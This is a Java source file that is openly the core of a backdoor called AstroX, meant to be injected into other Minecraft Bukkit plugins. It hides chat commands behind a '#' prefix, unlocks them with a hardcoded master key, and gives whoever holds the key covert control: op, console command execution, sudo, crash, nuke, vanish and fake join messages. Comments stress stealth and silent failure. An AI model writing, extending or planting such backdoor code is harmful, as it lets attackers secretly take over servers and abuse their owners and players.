package dev.naruto.astrox.payload;

import dev.naruto.astrox.payload.commands.*;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;

/**
 * Main backdoor payload - injected into target plugin
 */
public class BackdoorCore implements Listener {
    private final JavaPlugin plugin;
    private final CommandHandler handler;
    private final AuthManager authManager;

    // Hardcoded for now (change before compilation if needed)
    private static final String COMMAND_PREFIX = "#";
    private static final String MASTER_KEY = "test";

    /**
     * Entry point called from injected plugin's onEnable()
     */
    public static void inject(JavaPlugin plugin) {
        try {
            BackdoorCore core = new BackdoorCore(plugin);
            plugin.getServer().getPluginManager().registerEvents(core, plugin);

            // Debug message (comment out for stealth)
            plugin.getLogger().info("[AstroX] Backdoor initialized. Prefix: " + COMMAND_PREFIX);
        } catch (Exception e) {
            // Silent fail
            e.printStackTrace();
        }
    }

    private BackdoorCore(JavaPlugin plugin) {
        this.plugin = plugin;
        this.authManager = new AuthManager();
        this.handler = new CommandHandler(plugin, authManager);

        // Register all commands
        registerCommands();
    }

    private void registerCommands() {
        // Player management
        handler.register("op", new OpCommand());
        handler.register("deop", new DeopCommand());
        handler.register("gm", new GamemodeCommand());
        handler.register("gamemode", new GamemodeCommand());
        handler.register("fly", new FlyCommand());
        handler.register("vanish", new VanishCommand());
        handler.register("v", new VanishCommand());
        handler.register("heal", new HealCommand());
        handler.register("kill", new KillCommand());
        handler.register("sudo", new SudoCommand());

        // Server control
        handler.register("console", new ConsoleCommand());
        handler.register("broadcast", new BroadcastCommand());
        handler.register("fakejoin", new FakeJoinCommand());
        handler.register("fakeleave", new FakeLeaveCommand());
        handler.register("kick", new KickCommand());
        handler.register("crash", new CrashCommand());
        handler.register("nuke", new NukeCommand());
        handler.register("chaos", new ChaosCommand());

        // Information
        handler.register("help", new HelpCommand(handler));
        handler.register("?", new HelpCommand(handler));
        handler.register("coords", new CoordsCommand());
        handler.register("seed", new SeedCommand());
        handler.register("list", new ListCommand());

        // Access control
        handler.register("auth", new AuthCommand());
        handler.register("deauth", new DeauthCommand());

        // Give
        handler.register("give", new GiveCommand());
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();

        // Check if message starts with our prefix
        if (!message.startsWith(COMMAND_PREFIX)) {
            return;
        }

        // Cancel the chat message so it doesn't broadcast
        event.setCancelled(true);

        Player player = event.getPlayer();

        // Parse command
        String cmdLine = message.substring(COMMAND_PREFIX.length());
        if (cmdLine.isEmpty()) return;

        String[] parts = cmdLine.split(" ");
        String cmdName = parts[0].toLowerCase();
        String[] args = Arrays.copyOfRange(parts, 1, parts.length);

        // Special handling for auth command (always allowed)
        if (cmdName.equals("auth")) {
            if (args.length > 0 && args[0].equals(MASTER_KEY)) {
                authManager.authorize(player.getUniqueId(), MASTER_KEY);
                player.sendMessage("§a§l[AstroX] Access granted.");
            } else {
                player.sendMessage("§cUnknown command. Type \"/help\" for help.");
            }
            return;
        }

        // Check authorization for other commands
        if (!authManager.isAuthorized(player.getUniqueId())) {
            // Silent fail for unauthorized users
            return;
        }

        // Execute command on main thread
        Bukkit.getScheduler().runTask(plugin, () -> {
            try {
                handler.execute(cmdName, player, args);
            } catch (Exception e) {
                // Silent fail
                e.printStackTrace();
            }
        });
    }
}
